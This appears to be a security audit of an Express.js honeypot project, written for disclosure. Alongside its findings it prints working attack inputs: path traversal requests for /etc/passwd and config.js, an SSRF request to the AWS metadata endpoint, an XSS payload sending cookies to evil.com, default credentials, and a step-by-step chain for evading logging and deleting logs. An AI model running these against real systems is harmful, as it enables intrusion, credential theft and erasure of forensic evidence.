# express-honeypot — Security Analysis

**Repo:** https://github.com/christophe77/express-honeypot  
**Type:** Node.js/Express web honeypot — LFI/RFI decoy, credential capture, beekeeper dashboard  
**Lane:** Single comprehensive lane (small codebase, ~15 files)

---

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 4 |
| HIGH | 4 |
| MEDIUM | 4 |
| LOW | 2 |

The honeypot contains a complete silent-operation evasion chain: an attacker who identifies express-honeypot (trivial via static strings) can enumerate the corpus unauthenticated, delete all logs via unauthenticated GET, and read file system paths via unauthenticated path traversal — generating zero log entries throughout. The SSRF finding is the most operationally severe: the honeypot fetches attacker-controlled URLs and returns the response body (including AWS IMDS) to the attacker.

---

## CRITICAL

### C1 — beekeeper/router.js:39 — Unauthenticated `/beekeeper/darts` API returns full capture corpus

```javascript
beekeeperRouter.get("/darts", (req, res) => {
  res.send(beekeeperController.getDarts());
});
```

The parent route `/beekeeper/` has HTTP Basic Auth. The `/beekeeper/darts` data sub-route does not. Any unauthenticated request returns all captured attacker data — IPs, headers, geolocation, ISP, request URLs, and captured credentials.

**Impact:** Full honeypot intelligence corpus is public.

---

### C2 — beekeeper/router.js:43 — Unauthenticated log deletion via GET

```javascript
beekeeperRouter.get("/d/log/:date", (req, res) => {
  const { date } = req.params;
  res.send(beekeeperController.deleteDayLog(date));
});
```

No auth. State-changing operation over an unauthenticated GET. An attacker who identifies the honeypot (via fingerprints below) can erase all logs by issuing `GET /beekeeper/d/log/YYYY-MM-DD` for each date.

**Impact:** Attacker operates silently — clears evidence after each session. Zero remaining forensic trail.

---

### C3 — hive/router.js:7-8 — Path traversal in unauthenticated file download

```javascript
const { file, path } = req.query;
const filePath = `${__dirname}/files/${path}/${file}`;
if (fs.existsSync(filePath)) {
    fs.createReadStream(filePath).pipe(res);
}
```

`path` and `file` are query parameters with zero sanitization. No auth on the route.

**Trigger:** `GET /hive/?path=../../../&file=config.js` reads config.js (credentials). `GET /hive/?path=../../../../etc&file=passwd` reads `/etc/passwd`.  
**Note:** `robots.txt` explicitly disallows `/hive/`, disclosing the target path.

---

### C4 — honey/controller.js:31 + honey/common/common.js:3 + honey/router.js:13-16 — Unfiltered SSRF with full response reflection

When a request URL contains `"http"` or `"www"`, the honeypot extracts the URL via regex and issues `axios.get(remoteUrl)` to the attacker-controlled address. The response is then:
1. Rendered into the page response body via `htmlTemplate.js:29` (raw, no encoding)
2. POSTed to `dpaste.com` (`reportMaker.js:44`)
3. Written to local disk

No blocklist on RFC1918 ranges, loopback, or cloud metadata endpoints.

**Trigger:** `GET /errors.php?error=http://169.254.169.254/latest/meta-data/` → honeypot fetches AWS IMDS and returns the response to the attacker in the HTTP response body.  
**Note:** README states "no real injection is possible" — this is incorrect. `remoteFileContent` is injected into HTML template raw.

---

## HIGH

### H1 — views/beekeeper/js/index.js:6-10,28-52 — Stored XSS in beekeeper dashboard via innerHTML

All attacker-controlled data from log entries is inserted into `innerHTML` without sanitization:
- `detail.url` — attacker's request URL
- `detail.fileInclusion` — attacker-controlled remote URL string
- `detail.ip` — source IP (X-Forwarded-For-poisoned per H2)
- `detail.location.isp` — ISP name from ip-api.com (third-party injection surface)
- `detail.headers` (key and value via `listHeaders()`) — all request headers

**Attack:** Attacker sends request with header `X-Custom: <script>document.location='http://evil.com/?c='+document.cookie</script>`. Header stored. When operator opens dashboard, XSS fires. Since the dashboard has Basic Auth credentials in the browser session, XSS can exfiltrate them.

---

### H2 — server.js:12 — Unconditional proxy trust enables IP spoofing

```javascript
app.set("trust proxy", true);
```

With `trust proxy: true`, Express reads client IP from `X-Forwarded-For`. Attacker spoofs IP in all logs. Compounds H1: spoofed IP rendered in dashboard via `${detail.ip}` without sanitization — XSS vector if attacker puts HTML in the header.

---

### H3 — server.js:14 — Wildcard CORS + unauthenticated data endpoint

`app.use(cors())` with no options sets `Access-Control-Allow-Origin: *`. Combined with C1 (unauthenticated `/beekeeper/darts`), any website cross-origin fetches the full captured data:

```javascript
fetch('http://honeypot.example.com/beekeeper/darts').then(r => r.json()).then(console.log)
```

---

### H4 — config.js:4-7 — Hardcoded default credentials `chris:chris`

```javascript
beekeeperCredentials: {
  username: "chris",
  password: "chris",
}
```

Basic Auth transmitted as Base64 over HTTP. Any deployment that doesn't edit `config.js` is wide open with credential `Y2hyaXM6Y2hyaXM=`.

---

## MEDIUM

### M1 — honey/controller.js:31 — Unauthenticated reconnaissance with no logging

Requests that do NOT contain `"http"` or `"www"` are silently served without logging. All 310 honeypot URL patterns in `sitemap.xml` can be enumerated with bare GET requests — zero log entries. Attacker probes to confirm identity before engaging or evading.

---

### M2 — honey/report/reportMaker.js:72 — Per-URL deduplication suppresses repeat-probe logging

```javascript
if (content.datas.filter((e) => e.url === reportDatas.url).length === 0) {
    content.datas.push(reportDatasCopy);
```

Only the first hit per URL per day is logged. Repeated requests from different IPs using the same URL pattern generate no new log entries after the first. Attacker replays any previously-logged URL invisibly.

---

### M3 — honey/report/reportMaker.js:41-51 — Captured content exfiltrated to public dpaste

Default config (`remoteFileSave.dpaste: true`) sends captured remote file content to `https://dpaste.com/api/`. The `reportUrl` (a public dpaste URL) is stored in the log and displayed on the dashboard. Captured data is stored on a third-party public paste service by default.

---

### M4 — seo/router.js:10 — robots.txt discloses data store path

```
User-agent: *\r\nDisallow: /hive/
```

Explicitly reveals `/hive/` as the file storage location. Combined with C3, tells an attacker exactly where to aim the path traversal.

---

## LOW

- **honey/controller.js:5** — Module ID timestamp `Date.now() / 1000 || 0` computed at module load, shared across all requests. Every log entry has the same `id`, breaking deduplication and correlation.
- **config.js:3** — `googleVerification: "SUVG0hSY3WwCI3Hvgu1eKU6D0aZTnCaMBITeX-3HNIE"` committed to repo and rendered in every `<meta>` tag. Operators who publish customized `config.js` to a public fork leak their GSC token.

---

## Fingerprint Table

| Signal | Location | Confidence |
|--------|----------|------------|
| `<html lang="bee">` | Every honey page | DEFINITIVE |
| `<title>Beeeeee 🐝</title>` | GET `/` | DEFINITIVE |
| Body: `"Welcome to bee learning, the best place to learn the bee language."` | GET `/` | DEFINITIVE |
| `<a href="./beekeeper">Beekeper Access</a>` (typo: missing 'e') | GET `/` | DEFINITIVE |
| `/sitemap.xml` with exactly 310 PHP LFI/RFI URLs matching `pages.js` | GET `/sitemap.xml` | DEFINITIVE |
| `robots.txt: Disallow: /hive/` | GET `/robots.txt` | HIGH |
| Default GSC key `SUVG0hSY3WwCI3Hvgu1eKU6D0aZTnCaMBITeX-3HNIE` in `<meta>` | Unmodified installs | HIGH |
| `GET /beekeeper/darts` returns JSON `.datas[]` shape, unauthenticated | Any time | Confirms identity + reveals all logs |

## Zero-Evidence Evasion Chain

```
GET /                        → confirm lang="bee" (no log written)
GET /sitemap.xml             → confirm 310 PHP LFI URLs (no log written)
GET /beekeeper/darts         → unauthenticated: read all existing capture data
GET /beekeeper/d/log/<date>  → delete log for each date in corpus
GET /hive/?path=../../&file= → path traversal (no log written)
```

Zero log entries written at any point. Attacker enters and exits with full intelligence and no forensic trace.
